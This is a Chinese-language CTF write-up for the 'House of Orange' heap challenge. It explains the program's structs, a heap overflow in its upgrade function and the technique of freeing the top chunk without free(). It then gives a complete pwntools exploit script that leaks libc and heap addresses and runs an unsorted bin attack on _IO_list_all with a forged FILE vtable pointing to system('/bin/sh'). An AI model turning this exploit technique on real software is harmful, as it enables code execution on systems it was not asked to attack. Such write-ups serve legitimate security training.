[TOC]
# checksec 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

# 程序逻辑
```
struct house{
    struct  pricecolor * ele;
    char * name;
}
struct pricecolor{
    int price;
    int color;
}
```

1. build house数目<3,malloc(sizeof(struct house)),house->name = malloc(size),house->ele=calloc(sizeof(pricecolor))
2. see 打印结构体
3. upgrade 对重输入的size未限制存在堆溢出。
4. give up exit(0)
没有free()

# 背景知识介绍
House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins

当top chunk 不满足malloc的分配需求。


fake top chunk 约束条件
1. 大小>= minsize(0x10)
2. 标识前一个chunk处于inuse 状态，结束地址是页对齐
3. top 除去fencepost的大小小于所需chunk
4. size 要小于之后申请的chunk size + minsize(0x10)


# exp
```
#coding:utf-8
from pwn import*
context.log_level = 'debug'
#p = remote('111.198.29.45',51320)
p = process('./houseoforange')
elf = ELF('./houseoforange')
libc = elf.libc

def menu(idx):
    p.recvuntil(': ')
    p.sendline(str(idx))

def see():
    menu(2)

def build(length, nm, pz, color):
    menu(1)
    p.recvuntil(":")
    p.sendline(str(length))
    p.recvuntil(":")
    p.send(nm)
    p.recvuntil(":")
    p.sendline(str(pz))
    p.recvuntil(":")
    p.sendline(str(color))

def upgrade(length, nm, pz, color):
    menu(3)
    p.recvuntil(":")
    p.sendline(str(length))
    p.recvuntil(":")
    p.send(nm)
    p.recvuntil(":")
    p.sendline(str(pz))
    p.recvuntil(":")
    p.sendline(str(color))

build(0x30,'a'*8,123,1)
#gdb.attach(p)

payload = 'a'*0x30 + p64(0) + p64(0x21) +'a'*16+ p64(0)+ p64(0xf81)
upgrade(len(payload),payload,123,2)
# bp1
build(0x1000,'b',123,1)
log.info('-----------------------leak address-------------------------')
# bp2
build(0x400,'a'*8,123,1)
see()
p.recvuntil("a"*8)
leak = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak -1640- 0x3c4b20
print "libc base address -->[%s]"%hex(libc_base)
#leak heap address
upgrade(0x400,'a'*16,123,1)
see()
p.recvuntil('a'*16)
leak_heap = u64(p.recv(6).ljust(8,'\x00'))
heap_base = leak_heap - 0xe0
print "leak_heap -->[%s]"%hex(leak_heap)
print "heap_base -->[%s]"%hex(heap_base)

_IO_list_all = libc.symbols['_IO_list_all'] + libc_base
system = libc.symbols['system'] + libc_base
log.info('-------------------------unsorted bin and build fake file--------------------------')
# bp3 
#fake chunk 
payload = 'a'*0x400
#???? 这里p64(0x21)的目的是什么 。。。。测试了没什么用。。
payload += p64(0) + p64(0x21) + 'a'*0x10
# 修改main_arena.bins[1] 
fake_file = '/bin/sh\x00' + p64(0x60)
#这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数
fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attack
fake_file += p64(0) + p64(1) #bypass check 
fake_file = fake_file.ljust(0xc0,'\x00')

payload += fake_file
payload += p64(0)*3
payload += p64(heap_base + 0x5e8)#vtable
payload += p64(0)*2
payload += p64(system)
upgrade(0x800,payload,123,1)

p.recv()
p.sendline('1')
p.interactive()

```
1. bp1 
分配0x1000 前后的堆区大小
```

```
被修改size的top chunk 被放入unsotted bin ，在unsorted bin中malloc
2. bp2
分配large bin chunk 结构使用 fd_nextsize, bk_nextsize 指向自身对地址，同时泄露libc和heap
```
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```
